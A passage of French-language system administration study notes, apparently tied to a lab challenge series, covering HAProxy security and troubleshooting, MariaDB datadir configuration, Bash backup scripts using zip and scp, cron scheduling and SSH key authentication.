    http-response set-header Strict-Transport-Security "max-age=31536000; includeSubDomains"
    
    # SSL options
    ssl-default-bind-ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384
    ssl-default-bind-options ssl-min-ver TLSv1.2
    
    default_backend web_servers

backend web_servers
    # Backend HTTP plain (SSL termination HAProxy)
    server web1 10.0.1.10:80 check
    server web2 10.0.1.11:80 check
```

### Sécurité HAProxy

**1. Rate limiting (anti-DDoS) :**

```haproxy
frontend web
    # Track client IP requests
    stick-table type ip size 100k expire 30s store http_req_rate(10s)
    http-request track-sc0 src
    http-request deny if { sc_http_req_rate(0) gt 100 }
    # Bloquer IP > 100 req/10s
```

**2. Whitelist/Blacklist IP :**

```haproxy
frontend web
    # ACL whitelist
    acl whitelist src 10.0.0.0/8 192.168.0.0/16
    
    # ACL blacklist
    acl blacklist src 203.0.113.50 198.51.100.0/24
    
    # Rules
    http-request deny if blacklist
    http-request allow if whitelist
    http-request deny
    # Deny all except whitelist
```

**3. Protection headers injection :**

```haproxy
frontend web
    # Remove malicious headers
    http-request del-header X-Forwarded-For
    http-request del-header X-Real-IP
    
    # Set trusted headers
    option forwardfor
    http-request set-header X-Real-IP %[src]
```

### Debugging HAProxy

**Problème : Service fails démarrage :**

```bash
# Vérifier syntax
sudo haproxy -c -f /etc/haproxy/haproxy.cfg
# Errors → ligne problématique affichée

# Vérifier logs
sudo journalctl -u haproxy -n 50
sudo tail -50 /var/log/messages | grep haproxy

# Causes communes :
# - Syntax error config (missing bracket, typo directive)
# - Port 80 already in use (nginx, apache running)
#   → sudo ss -tuln | grep :80
#   → sudo systemctl stop nginx
# - Permissions /var/lib/haproxy/ (user haproxy)
#   → sudo chown -R haproxy:haproxy /var/lib/haproxy/
```

**Problème : Backends toujours DOWN :**

```bash
# Vérifier backend accessible
curl http://172.16.238.10:5004
# Si refused/timeout → backend down ou firewall

# Vérifier logs health checks
sudo journalctl -u haproxy | grep -i "health"

# Stats socket check
echo "show stat" | sudo socat stdio /var/lib/haproxy/stats | grep stapp01
# Colonne status : UP = OK, DOWN = fail

# Solutions :
# 1. Démarrer backend service
sudo ssh 172.16.238.10 "sudo systemctl start httpd"

# 2. Firewall backend
sudo ssh 172.16.238.10 "sudo firewall-cmd --add-port=5004/tcp --permanent; sudo firewall-cmd --reload"

# 3. Vérifier IP:PORT correct config HAProxy
grep "server" /etc/haproxy/haproxy.cfg
```

**Problème : Load balancing asymétrique :**

```bash
# Tester distribution
for i in {1..30}; do curl -s http://localhost | grep -i "server"; done
# Doit alterner stapp01, stapp02, stapp03 si roundrobin

# Vérifier weights serveurs
echo "show stat" | sudo socat stdio /var/lib/haproxy/stats | grep -E "stapp0[123]"
# Colonne weight : 1 = normal, 0 = disabled

# Vérifier algorithm balance
grep "balance" /etc/haproxy/haproxy.cfg
```

**Problème : 503 Service Unavailable :**

```bash
# Cause : Tous backends DOWN ou maxconn atteint

# Vérifier backends UP
echo "show stat" | sudo socat stdio /var/lib/haproxy/stats

# Vérifier queues
echo "show stat" | sudo socat stdio /var/lib/haproxy/stats | grep -i queue
# Queue >0 = trafic en attente (augmenter maxconn ou backends)

# Solution : Augmenter maxconn backend
# backend app
#     server web1 10.0.1.10:80 check maxconn 1000
```

### Performance Tuning HAProxy

**Tuning paramètres global :**

```haproxy
global
    # Connexions max
    maxconn 50000
    # Calcul : (RAM - OS) / 50KB per conn
    # Exemple : 8GB → 160000 conn max
    
    # Threads (HAProxy 2.0+)
    nbthread 8
    # 1 thread par CPU core (auto-detect ou manual)
    
    # Buffers
    tune.bufsize 32768
    # Buffer size per connexion (défaut 16KB)
```

**Tuning timeouts :**

```haproxy
defaults
    # API short-lived
    timeout client 30s
    timeout server 30s
    
    # WebSockets / Long-polling
    timeout client 1h
    timeout server 1h
    timeout tunnel 1h
```

### ⚠️ Pitfalls HAProxy

1. **Supprimer stats socket** → Admin CLI disable (Challenge 16 consigne CRITIQUE)
2. **Port 80 already in use** → HAProxy fail start (stop nginx/apache avant)
3. **Logs vides** → rsyslog UDP pas activé (rsyslog.conf config requis)
4. **Backends DOWN** → Firewall bloque health checks (ouvrir ports backends)
5. **503 errors** → maxconn trop faible OU tous backends down
6. **Oublier `check`** → Backends jamais health checked (backend down = trafic perdu)
7. **Reload sans test syntax** → Config invalide = service down
   ```bash
   # TOUJOURS faire :
   haproxy -c -f /etc/haproxy/haproxy.cfg && systemctl reload haproxy
   ```
8. **SSL cert format incorrect** → PEM format requis (cert + key + intermediate)
9. **Timeouts trop courts** → Requêtes slow tuées (uploads, downloads)
10. **option forwardfor oublié** → Backend logs IP HAProxy (pas client)

### Fichiers HAProxy importants

**Configuration :**
- `/etc/haproxy/haproxy.cfg` : Config principale
- `/etc/haproxy/errors/` : Pages erreur custom (400, 500, 502, 503)

**Runtime :**
- `/var/lib/haproxy/stats` : Stats socket (admin CLI)
- `/var/run/haproxy.pid` : PID daemon
- `/var/lib/haproxy/` : Chroot directory

**Logs :**
- `/var/log/haproxy.log` : Logs HAProxy (si rsyslog configuré)
- `/var/log/messages` : Logs système (RHEL - contient HAProxy logs)
- `journalctl -u haproxy` : Logs systemd

### HAProxy Troubleshooting Common Issues (Challenge 17)

**Error: "unable to find required default_backend"** :

```bash
# Symptôme
sudo systemctl start haproxy
sudo systemctl status haproxy
# [ALERT] Proxy 'main': unable to find required default_backend: 'app'

# Root cause
# Frontend déclare default_backend qui n'existe pas (absent ou commenté)

# Exemple config BROKEN :
frontend main
    bind *:80
    default_backend app    # ← Référence backend "app"

#backend app               # ← COMMENTÉ = backend inexistant ❌
#    balance roundrobin
#    server web1 10.0.1.10:80 check

# Solution
# Décommenter backend (supprimer # devant toutes lignes)
backend app
    balance roundrobin
    server web1 10.0.1.10:80 check

# Reload HAProxy
sudo systemctl restart haproxy
```

**Debugging workflow configuration issues** :

```bash
# Step 1 : Test syntax config (AVANT start/restart)
haproxy -c -f /etc/haproxy/haproxy.cfg
# Output errors précis (ligne + raison)

# Step 2 : Vérifier logs détaillés
sudo journalctl -u haproxy -n 50
sudo tail -50 /var/log/messages | grep haproxy

# Step 3 : Vérifier frontends → backends mapping
grep "default_backend\|use_backend" /etc/haproxy/haproxy.cfg
# Lister backends référencés

grep "^backend" /etc/haproxy/haproxy.cfg
# Lister backends déclarés

# Comparer : Tous backends référencés doivent exister

# Step 4 : Vérifier sections complètes (pas partiellement commentées)
# MAUVAIS :
# backend app
    balance roundrobin    # ← Ligne pas indentée (hors section)
# CORRECT :
# backend app
#     balance roundrobin   # ← Toute section commentée cohérente
```

**Causes communes config errors** :

1. **Backend manquant/commenté** (Challenge 17) :
   ```haproxy
   frontend main
       default_backend app
   # backend app manquant → ALERT unable to find
   ```

2. **Typo nom backend** :
   ```haproxy
   frontend main
       default_backend application
   backend app         # ← Nom différent
   ```

3. **Section incomplete** :
   ```haproxy
   backend app
   # balance manquant, servers manquants → syntax error
   ```

4. **Duplicate sections** :
   ```haproxy
   backend app
       balance roundrobin
   backend app         # ← Duplicate (override ou error)
   ```

**Safe config editing workflow** :

```bash
# 1. Backup config avant modif
sudo cp /etc/haproxy/haproxy.cfg /etc/haproxy/haproxy.cfg.backup.$(date +%Y%m%d_%H%M%S)

# 2. Éditer config
sudo vi /etc/haproxy/haproxy.cfg

# 3. Test syntax (CRITICAL)
haproxy -c -f /etc/haproxy/haproxy.cfg
# Si errors → corriger AVANT reload

# 4. Reload (0 downtime) OU restart
if haproxy -c -f /etc/haproxy/haproxy.cfg; then
    sudo systemctl reload haproxy
    echo "Config reloaded successfully"
else
    echo "Config INVALID - reload aborted"
    exit 1
fi

# 5. Vérifier service active
sudo systemctl status haproxy

# 6. Test application
curl http://localhost
```

**Production safety measures** :

```bash
# Script safe reload HAProxy
#!/bin/bash
CONFIG='/etc/haproxy/haproxy.cfg'
BACKUP="/etc/haproxy/haproxy.cfg.backup.$(date +%Y%m%d_%H%M%S)"

# Backup
cp $CONFIG $BACKUP

# Éditer (remplacer par votre éditeur)
vi $CONFIG

# Test syntax
if haproxy -c -f $CONFIG; then
    echo "Syntax OK - Reloading HAProxy..."
    systemctl reload haproxy
    if [ $? -eq 0 ]; then
        echo "HAProxy reloaded successfully"
    else
        echo "Reload FAILED - Restoring backup"
        cp $BACKUP $CONFIG
        systemctl reload haproxy
    fi
else
    echo "Syntax ERROR - Restoring backup"
    cp $BACKUP $CONFIG
fi
```

---

## Module 33 : MariaDB / MySQL - Database Server (Challenge 18)

**Concepts :**
- **MariaDB** : Fork open source MySQL (compatible MySQL, plus features)
- **MySQL** : SGBD relationnel populaire (Oracle)
- **Daemon** : Service `mariadb` ou `mysqld` (port 3306 défaut)
- **Datadir** : Répertoire stockage databases (`/var/lib/mysql` défaut)

### MariaDB vs MySQL

| Critère | MariaDB | MySQL |
|---------|---------|-------|
| Licence | GPL (100% open source) | Dual (GPL + Commercial Oracle) |
| Performance | Galera Cluster (replication) | InnoDB Cluster |
| Storage engines | Aria, ColumnStore, Spider | InnoDB focus |
| JSON | Native JSON (MySQL compatible) | Native JSON |
| Compatibilité | Drop-in replacement MySQL | N/A |
| Développement | Community-driven | Oracle-driven |
| Use case | Alternative open source MySQL | Standard industry (Laravel, WordPress) |

### Installation MariaDB

```bash
# RHEL/CentOS/Rocky
sudo yum install mariadb-server mariadb -y

# Debian/Ubuntu
sudo apt install mariadb-server mariadb-client -y

# Démarrer + activer boot
sudo systemctl enable --now mariadb

# Vérifier statut
sudo systemctl status mariadb

# Vérifier version
mysql --version
# mysql  Ver 15.1 Distrib 10.5.18-MariaDB

mysqld --version
# mysqld  Ver 10.5.18-MariaDB
```

### Configuration MariaDB - Fichiers

**Ordre lecture config (priorité décroissante) :**
1. `/etc/my.cnf` : Config globale (override tout)
2. `/etc/my.cnf.d/*.cnf` : Config modulaires (mariadb-server.cnf, mysql-clients.cnf)
3. `~/.my.cnf` : Config user (credentials, defaults)

**Fichier principal serveur :**
```bash
/etc/my.cnf.d/mariadb-server.cnf   # RHEL/CentOS
/etc/mysql/mariadb.conf.d/50-server.cnf  # Debian/Ubuntu
```

### Configuration datadir (Challenge 18)

**Section `[mysqld]` - `/etc/my.cnf.d/mariadb-server.cnf` :**

```ini
[mysqld]
# Emplacement data databases (CRITICAL)
datadir=/var/lib/mysql

# Socket UNIX connexions locales
socket=/var/lib/mysql/mysql.sock

# Port TCP/IP
port=3306

# Bind address (IP écoute)
bind-address=0.0.0.0
# 0.0.0.0 = toutes interfaces
# 127.0.0.1 = localhost uniquement (sécurité)

# User daemon
user=mysql

# PID file
pid-file=/var/run/mariadb/mariadb.pid

# Logs
log-error=/var/log/mariadb/mariadb.log

# Slow query log (performance tuning)
slow_query_log=1
slow_query_log_file=/var/log/mariadb/slow.log
long_query_time=2

# General query log (debug)
general_log=0
general_log_file=/var/log/mariadb/general.log
```

### Datadir Troubleshooting (Challenge 18)

**Error: "directory is not empty, initialization cannot be done"** :

```bash
# Symptôme
sudo systemctl start mariadb
sudo systemctl status mariadb
# mariadb-prepare-db-dir: Database MariaDB is not initialized, 
# but the directory /var/lib/mysql is not empty, so initialization cannot be done.

# Root cause (Challenge 18)
# Config pointe /var/lib/mysql MAIS data réellement dans /var/lib/mysqld

# Diagnostic
ls /var/lib/ | grep mysql
# Output : mysqld (au lieu de mysql)

# Solution : Modifier config pour pointer datadir réel
sudo vi /etc/my.cnf.d/mariadb-server.cnf

# AVANT (incorrect) :
[mysqld]
datadir=/var/lib/mysql
socket=/var/lib/mysql/mysql.sock

# APRÈS (correct) :
[mysqld]
datadir=/var/lib/mysqld
socket=/var/lib/mysqld/mysql.sock

# Restart MariaDB
sudo systemctl start mariadb
sudo systemctl status mariadb
# Active (running) ✅
```

**Vérifier datadir actif** :

```bash
# Méthode 1 : MySQL query
mysql -u root -p -e "SHOW VARIABLES LIKE 'datadir';"
# +---------------+------------------+
# | Variable_name | Value            |
# +---------------+------------------+
# | datadir       | /var/lib/mysqld/ |
# +---------------+------------------+

# Méthode 2 : mysqld command
mysqld --help --verbose | grep datadir
# datadir     /var/lib/mysqld

# Méthode 3 : Vérifier socket existe
ls -la /var/lib/mysqld/mysql.sock
sudo ss -xl | grep mysql
```

**Contenu datadir typique** :

```bash
ls -la /var/lib/mysql/
# drwxr-x---  mysql mysql  ibdata1           # InnoDB system tablespace
# drwxr-x---  mysql mysql  ib_logfile0       # InnoDB redo logs
# drwxr-x---  mysql mysql  ib_logfile1
# drwx------  mysql mysql  mysql/            # System database
# drwx------  mysql mysql  performance_schema/
# drwx------  mysql mysql  mydatabase/       # User databases
# -rw-rw----  mysql mysql  mysql.sock        # Socket UNIX
```

### Datadir Migration (procédure production)

```bash
# Use case : Migrer datadir vers nouveau disque (plus espace)

# 1. Stop MariaDB
sudo systemctl stop mariadb

# 2. Backup data actuelle (CRITICAL)
sudo tar -czf /backup/mariadb_data_$(date +%Y%m%d).tar.gz /var/lib/mysql

# 3. Créer nouveau datadir
sudo mkdir -p /new/datadir

# 4. Copier data (rsync preserve permissions)
sudo rsync -av /var/lib/mysql/ /new/datadir/

# 5. Permissions (CRITICAL)
sudo chown -R mysql:mysql /new/datadir
sudo chmod 750 /new/datadir

# 6. Modifier config
sudo vi /etc/my.cnf.d/mariadb-server.cnf
# datadir=/new/datadir
# socket=/new/datadir/mysql.sock

# 7. SELinux context (si SELinux actif)
sudo semanage fcontext -a -t mysqld_db_t "/new/datadir(/.*)?"
sudo restorecon -Rv /new/datadir

# 8. Test config syntax
mysqld --defaults-file=/etc/my.cnf.d/mariadb-server.cnf --help --verbose | grep datadir

# 9. Start MariaDB
sudo systemctl start mariadb

# 10. Vérifier connexion + datadir
mysql -u root -p -e "SHOW VARIABLES LIKE 'datadir';"
mysql -u root -p -e "SHOW DATABASES;"

# 11. Si OK, supprimer ancien datadir (APRÈS tests complets)
# sudo rm -rf /var/lib/mysql.old
```

### Permissions datadir (CRITICAL sécurité)

```bash
# Owner DOIT être mysql:mysql
sudo chown -R mysql:mysql /var/lib/mysql

# Permissions restrictives
sudo chmod 750 /var/lib/mysql
# 750 = rwxr-x--- (owner full, group read+exec, others none)

# Vérifier
ls -ld /var/lib/mysql
# drwxr-x--- 5 mysql mysql 4096 Jan 16 10:00 /var/lib/mysql

# ⚠️ Permissions incorrectes → MariaDB refuse démarrer
# Error : "Can't read dir of '/var/lib/mysql/'"
```

### MariaDB Troubleshooting Common Issues

**Issue 1 : Service fails - datadir mismatch** (Challenge 18) :
```bash
# Symptom : systemctl start mariadb fails
# Error : "directory /var/lib/mysql is not empty"
# Solution : Modifier config datadir pour pointer data réelle
```

**Issue 2 : Service fails - permissions** :
```bash
# Symptom : Permission denied accessing datadir
# Solution :
sudo chown -R mysql:mysql /var/lib/mysql
sudo chmod 750 /var/lib/mysql
sudo systemctl restart mariadb
```

**Issue 3 : Service fails - port 3306 déjà utilisé** :
```bash
# Diagnostic
sudo ss -tuln | grep 3306
# Si autre process écoute 3306 → kill ou change port

# Solution : Modifier port MariaDB
sudo vi /etc/my.cnf.d/mariadb-server.cnf
# port=3307
sudo systemctl restart mariadb
```

**Issue 4 : Disk full (ibdata1 trop gros)** :
```bash
# Diagnostic
df -h /var/lib/mysql
du -sh /var/lib/mysql/ibdata1

# Solutions :
# 1. Purge binary logs
mysql -u root -p -e "PURGE BINARY LOGS BEFORE NOW();"

# 2. Optimize tables
mysql -u root -p -e "OPTIMIZE TABLE mydatabase.mytable;"

# 3. Enable innodb_file_per_table (new installs)
# /etc/my.cnf.d/mariadb-server.cnf
# innodb_file_per_table=1
```

**Issue 5 : Connexion refused** :
```bash
# Diagnostic
sudo systemctl status mariadb
# Si running → vérifier bind-address

mysql -u root -p -h 127.0.0.1
# Si success → MariaDB OK

# Vérifier bind-address
mysql -u root -p -e "SHOW VARIABLES LIKE 'bind_address';"
# bind_address = 127.0.0.1 → localhost only
# bind_address = 0.0.0.0 → all interfaces

# Modifier
sudo vi /etc/my.cnf.d/mariadb-server.cnf
# bind-address=0.0.0.0
sudo systemctl restart mariadb
```

### MariaDB Security (production)

```bash
# Initialisation sécurité (1x après install)
sudo mysql_secure_installation
# - Set root password
# - Remove anonymous users
# - Disallow root login remotely
# - Remove test database
# - Reload privilege tables

# Créer user application (pas root)
mysql -u root -p
CREATE USER 'appuser'@'localhost' IDENTIFIED BY 'StrongPassword123!';
GRANT SELECT, INSERT, UPDATE, DELETE ON appdb.* TO 'appuser'@'localhost';
FLUSH PRIVILEGES;

# Vérifier users
SELECT User, Host FROM mysql.user;

# Firewall (bloquer 3306 internet)
sudo firewall-cmd --permanent --add-rich-rule='rule family="ipv4" source address="10.0.1.0/24" port port="3306" protocol="tcp" accept'
sudo firewall-cmd --reload
```

### Fichiers MariaDB importants

**Configuration :**
- `/etc/my.cnf` : Config globale
- `/etc/my.cnf.d/mariadb-server.cnf` : Config serveur MariaDB
- `/etc/my.cnf.d/mysql-clients.cnf` : Config clients MySQL
- `~/.my.cnf` : Config user (credentials)

**Data :**
- `/var/lib/mysql/` : Datadir (databases, tables, logs)
- `/var/lib/mysql/ibdata1` : InnoDB system tablespace
- `/var/lib/mysql/ib_logfile*` : InnoDB redo logs
- `/var/lib/mysql/mysql/` : System database
- `/var/lib/mysql/mysql.sock` : Socket UNIX

**Logs :**
- `/var/log/mariadb/mariadb.log` : Error log
- `/var/log/mariadb/slow.log` : Slow query log
- `/var/log/mariadb/general.log` : General query log

---

## Module 34 : Bash Scripting Automation (Challenge 19)

**Concepts :**
- **Bash** : Shell scripting language (automation tasks)
- **Shebang** : `#!/bin/bash` (ligne 1, interpreter)
- **Script** : Fichier texte exécutable (séquence commandes)
- **Variables** : Stockage données (`VAR=value`, `$VAR`)

### Bash Script Structure

```bash
#!/bin/bash

#######################################################
# Script Name: backup.sh
# Description: Automated backup script
# Author: Admin Team
# Date: 2026-01-16
# Version: 1.0
#######################################################

# Exit on error (fail-fast)
set -e

# Exit on undefined variable
set -u

# Pipe failure = script failure
set -o pipefail

# Variables
BACKUP_DIR='/backup'
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="/var/log/backup_${TIMESTAMP}.log"

# Functions
log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

error_exit() {
    log "ERROR: $1"
    exit 1
}

# Main execution
main() {
    log "=== Script started ==="
    # Your code here
    log "=== Script completed ==="
}

# Run main
main "$@"
```

### Variables Bash

```bash
# Déclaration
NAME="value"
AGE=30

# Utilisation (TOUJOURS quotes)
echo "$NAME"
echo "My name is $NAME and I am $AGE years old"

# Variables readonly
readonly CONST="immutable"
CONST="new"  # Error : readonly variable

# Variables environment
export PATH="/usr/local/bin:$PATH"
export DATABASE_URL="mysql://user:pass@host/db"

# Variables spéciales
$0     # Nom script
$1-$9  # Arguments script
$@     # Tous arguments (array)
$#     # Nombre arguments
$?     # Exit code dernière commande
$$     # PID script
$!     # PID dernier background process

# Exemple arguments
#!/bin/bash
echo "Script name: $0"
echo "First arg: $1"
echo "Second arg: $2"
echo "All args: $@"
echo "Number args: $#"
```

### Commandes Bash courantes scripts

```bash
# Tests conditionnels
if [ -f "/path/file" ]; then
    echo "File exists"
elif [ -d "/path/dir" ]; then
    echo "Directory exists"
else
    echo "Nothing found"
fi

# Tests fichiers/dossiers
-f file    # File exists
-d dir     # Directory exists
-r file    # Readable
-w file    # Writable
-x file    # Executable
-s file    # File not empty

# Tests strings
-z "$var"        # String vide
-n "$var"        # String non-vide
"$a" = "$b"      # Strings égales
"$a" != "$b"     # Strings différentes

# Tests numériques
$a -eq $b        # Égal
$a -ne $b        # Différent
$a -lt $b        # Less than
$a -gt $b        # Greater than
$a -le $b        # Less or equal
$a -ge $b        # Greater or equal

# Boucles for
for file in /path/*.txt; do
    echo "Processing: $file"
done

for i in {1..10}; do
    echo "Number: $i"
done

# Boucles while
while [ $count -lt 10 ]; do
    echo "Count: $count"
    ((count++))
done

# Functions
my_function() {
    local arg1=$1
    local arg2=$2
    echo "Args: $arg1, $arg2"
    return 0
}

my_function "hello" "world"
```

### Backup Script (Challenge 19)

```bash
#!/bin/bash

#######################################################
# Script: news_backup.sh
# Description: Backup website + copy to remote server
# Requirements: zip package, SSH key configured
#######################################################

# Variables
TARGET_DIR='/var/www/html/news'
BACKUP_DIR='/backup'
ARCHIVE_NAME='xfusioncorp_news.zip'
ARCHIVE_PATH="${BACKUP_DIR}/${ARCHIVE_NAME}"
BACKUP_SERVER='clint@stbkp01'
REMOTE_PATH='/backup/'

# Create ZIP archive
zip -r "$ARCHIVE_PATH" "$TARGET_DIR"

# Copy to backup server (SSH key auth - no password)
scp "$ARCHIVE_PATH" "${BACKUP_SERVER}:${REMOTE_PATH}"
```

**Script amélioré (production-ready)** :

```bash
#!/bin/bash

set -e

# Variables
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
TARGET_DIR='/var/www/html/news'
BACKUP_DIR='/backup'
ARCHIVE_NAME="xfusioncorp_news_${TIMESTAMP}.zip"
ARCHIVE_PATH="${BACKUP_DIR}/${ARCHIVE_NAME}"
BACKUP_SERVER='clint@stbkp01'
REMOTE_PATH='/backup/'
LOG_FILE="/var/log/backup_${TIMESTAMP}.log"
RETENTION_DAYS=7

# Functions
log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

error_exit() {
    log "ERROR: $1"
    exit 1
}

check_prerequisites() {
    # Zip installed
    if ! command -v zip &> /dev/null; then
        error_exit "zip command not found. Install: yum install zip"
    fi
    
    # Target dir exists
    if [ ! -d "$TARGET_DIR" ]; then
        error_exit "Target directory not found: $TARGET_DIR"
    fi
    
    # Backup dir exists
    if [ ! -d "$BACKUP_DIR" ]; then
        log "Creating backup directory: $BACKUP_DIR"
        mkdir -p "$BACKUP_DIR" || error_exit "Failed to create backup dir"
    fi
    
    # Disk space (au moins 1GB libre)
    FREE_SPACE=$(df -BG "$BACKUP_DIR" | awk 'NR==2 {print $4}' | sed 's/G//')
    if [ "$FREE_SPACE" -lt 1 ]; then
        error_exit "Insufficient disk space: ${FREE_SPACE}GB"
    fi
}

create_archive() {
    log "Creating archive: $ARCHIVE_PATH"
    zip -r "$ARCHIVE_PATH" "$TARGET_DIR" >> "$LOG_FILE" 2>&1
    
    if [ $? -eq 0 ]; then
        ARCHIVE_SIZE=$(du -h "$ARCHIVE_PATH" | cut -f1)
        log "Archive created successfully (size: $ARCHIVE_SIZE)"
    else
        error_exit "Archive creation failed"
    fi
}

copy_to_remote() {
    log "Copying to backup server: $BACKUP_SERVER"
    scp "$ARCHIVE_PATH" "${BACKUP_SERVER}:${REMOTE_PATH}" >> "$LOG_FILE" 2>&1
    
    if [ $? -eq 0 ]; then
        log "Archive copied successfully"
    else
        error_exit "Copy to backup server failed"
    fi
}

cleanup_old_backups() {
    log "Cleaning old local backups (retention: ${RETENTION_DAYS} days)"
    find "$BACKUP_DIR" -name "xfusioncorp_news_*.zip" -type f -mtime +${RETENTION_DAYS} -delete
    
    # Remote cleanup (SSH)
    ssh "${BACKUP_SERVER}" "find ${REMOTE_PATH} -name 'xfusioncorp_news_*.zip' -type f -mtime +${RETENTION_DAYS} -delete" >> "$LOG_FILE" 2>&1
}

# Main
main() {
    log "=== Backup script started ==="
    check_prerequisites
    create_archive
    copy_to_remote
    cleanup_old_backups
    log "=== Backup completed successfully ==="
}

main "$@"
```

### ZIP Archives

```bash
# Créer archive
zip archive.zip file1.txt file2.txt
zip -r archive.zip directory/          # Récursif
zip -r -9 archive.zip directory/       # Compression max (level 9)
zip -r -q archive.zip directory/       # Quiet (pas output)
zip -r -e archive.zip directory/       # Encrypted (password)

# Ajouter fichiers archive existante
zip archive.zip newfile.txt

# Supprimer fichiers archive
zip -d archive.zip file1.txt

# Lister contenu (pas extraire)
unzip -l archive.zip

# Extraire archive
unzip archive.zip
unzip archive.zip -d /destination/
unzip -q archive.zip                   # Quiet

# Test integrity archive
unzip -t archive.zip

# Voir info archive
zipinfo archive.zip

# Compression levels
-0    # No compression (store only)
-1    # Fastest compression
-6    # Default compression
-9    # Maximum compression (slowest)
```

### SCP (Secure Copy)

```bash
# Copy file local → remote
scp /local/file.txt user@host:/remote/path/

# Copy file remote → local
scp user@host:/remote/file.txt /local/path/

# Copy directory recursively
scp -r /local/directory/ user@host:/remote/path/

# Copy multiple files
scp file1.txt file2.txt user@host:/remote/path/

# Port custom SSH
scp -P 2222 file.txt user@host:/path/

# Bandwidth limit (KB/s)
scp -l 1000 file.txt user@host:/path/
# Limit 1000 KB/s = 1 MB/s

# Preserve permissions + timestamps
scp -p file.txt user@host:/path/

# Verbose (debug)
scp -v file.txt user@host:/path/

# Compression (faster transfer slow networks)
scp -C file.txt user@host:/path/

# Identity file (specific SSH key)
scp -i ~/.ssh/custom_key file.txt user@host:/path/
```

### Cron Jobs (automatisation backups)

```bash
# Éditer crontab user
crontab -e

# Lister cron jobs
crontab -l

# Syntaxe crontab
# Minute Hour Day Month Weekday Command
#   0-59  0-23 1-31 1-12  0-7

# Examples
0 2 * * * /scripts/news_backup.sh           # Tous les jours 2h AM
0 2 * * 0 /scripts/weekly_backup.sh         # Tous les dimanches 2h AM
0 */6 * * * /scripts/hourly_backup.sh       # Toutes les 6 heures
*/15 * * * * /scripts/check_status.sh       # Toutes les 15 minutes
0 2 1 * * /scripts/monthly_backup.sh        # 1er de chaque mois 2h AM

# Logs cron job
0 2 * * * /scripts/news_backup.sh >> /var/log/backup.log 2>&1

# Email si échec
0 2 * * * /scripts/news_backup.sh || mail -s "Backup FAILED" admin@example.com

# Variables cron
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=admin@example.com

0 2 * * * /scripts/news_backup.sh
```

---

## Module 35 : SSH Keys Authentication (Challenge 19)

**Concepts :**
- **SSH (Secure Shell)** : Protocole connexion sécurisée remote servers
- **Public Key Authentication** : Authentification sans password (paire clés asymétriques)
- **Private Key** : Clé secrète (client, JAMAIS partager)
- **Public Key** : Clé publique (serveurs distants, authorized_keys)

### SSH Keys vs Password Authentication

| Critère | SSH Keys | Password |
|---------|----------|----------|
| Sécurité | ✅✅✅ Très élevée (2048+ bits) | ⚠️ Dépend force password |
| Brute force | ✅ Résistant (clé 2048-bit impossible) | ❌ Vulnérable (dictionary attacks) |
| Convenience | ✅ Passwordless (1 setup) | ❌ Enter password chaque connexion |
| Automation | ✅ Scripts, cron jobs | ❌ Impossible automatiser |
| Révocation | ✅ Supprimer clé publique serveur | ⚠️ Change password |
| Multiple servers | ✅ 1 clé → N serveurs | ❌ 1 password par serveur |

### SSH Key Workflow (Challenge 19)

```bash
# Step 1 : Générer paire clés (client)
ssh-keygen
# Prompt :
# - File : /home/user/.ssh/id_rsa (défaut, appuyer Enter)
# - Passphrase : (OPTIONNEL, appuyer Enter si pas passphrase)

# Output :
# ~/.ssh/id_rsa         # Clé privée (SECRÈTE)
# ~/.ssh/id_rsa.pub     # Clé publique (copier vers serveurs)

# Step 2 : Copier clé publique vers serveur distant
ssh-copy-id user@remote-server
# Demande password user@remote-server (1x uniquement)
# Copie ~/.ssh/id_rsa.pub → /home/user/.ssh/authorized_keys (serveur)

# Step 3 : Connexion passwordless
ssh user@remote-server
# Connexion SANS password ✅
```

### ssh-keygen (générer clés)

```bash
# Générer clé RSA (défaut, 3072-bit)
ssh-keygen
# Appuyer Enter (défauts OK) ou custom file/passphrase

# Générer clé ED25519 (recommandé moderne, plus court + rapide)
ssh-keygen -t ed25519 -C "user@email.com"

# Générer clé RSA 4096-bit (plus sécurisé)
ssh-keygen -t rsa -b 4096 -C "user@email.com"

# Spécifier nom fichier custom
ssh-keygen -f ~/.ssh/id_rsa_myserver

# Changer passphrase clé existante
ssh-keygen -p -f ~/.ssh/id_rsa

# Afficher fingerprint clé
ssh-keygen -lf ~/.ssh/id_rsa.pub
# 3072 SHA256:abc123... user@host (RSA)

# Supprimer host de known_hosts (après reinstall serveur)
ssh-keygen -R hostname
```

### ssh-copy-id (copier clé publique)

```bash
# Copier clé publique défaut vers serveur
ssh-copy-id user@remote-server

# Copier clé publique spécifique
ssh-copy-id -i ~/.ssh/id_rsa_custom.pub user@remote-server

# Port SSH custom
ssh-copy-id -p 2222 user@remote-server

# Verbose (debug)
ssh-copy-id -v user@remote-server

# Si ssh-copy-id pas disponible (manuel) :
cat ~/.ssh/id_rsa.pub | ssh user@remote-server "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"
```

### Permissions SSH (CRITICAL sécurité)

```bash
# ~/.ssh/ directory
chmod 700 ~/.ssh/
# 700 = rwx------ (owner only)

# Private key
chmod 600 ~/.ssh/id_rsa
# 600 = rw------- (owner read/write only)

# Public key
chmod 644 ~/.ssh/id_rsa.pub
# 644 = rw-r--r-- (world readable)

# authorized_keys (serveur)
chmod 600 ~/.ssh/authorized_keys

# known_hosts
chmod 644 ~/.ssh/known_hosts

# ⚠️ SSH refuse connexion si permissions incorrectes
# Error : "Permissions 0755 for '/home/user/.ssh/id_rsa' are too open"
```

### SSH Config (~/.ssh/config)

```bash
# Simplifier connexions multiples serveurs
# ~/.ssh/config

# Server 1
Host myserver
    HostName 192.168.1.100
    User admin
    Port 2222
    IdentityFile ~/.ssh/id_rsa_myserver

# Server 2
Host backup-server
    HostName stbkp01.example.com
    User clint
    IdentityFile ~/.ssh/id_rsa

# Wildcard (tous serveurs *.example.com)
Host *.example.com
    User admin
    IdentityFile ~/.ssh/id_rsa_company
    ServerAliveInterval 60

# Connexion simplifiée
ssh myserver
# Équivalent : ssh -p 2222 admin@192.168.1.100 -i ~/.ssh/id_rsa_myserver
```

### ssh-agent (gestion clés avec passphrase)

```bash
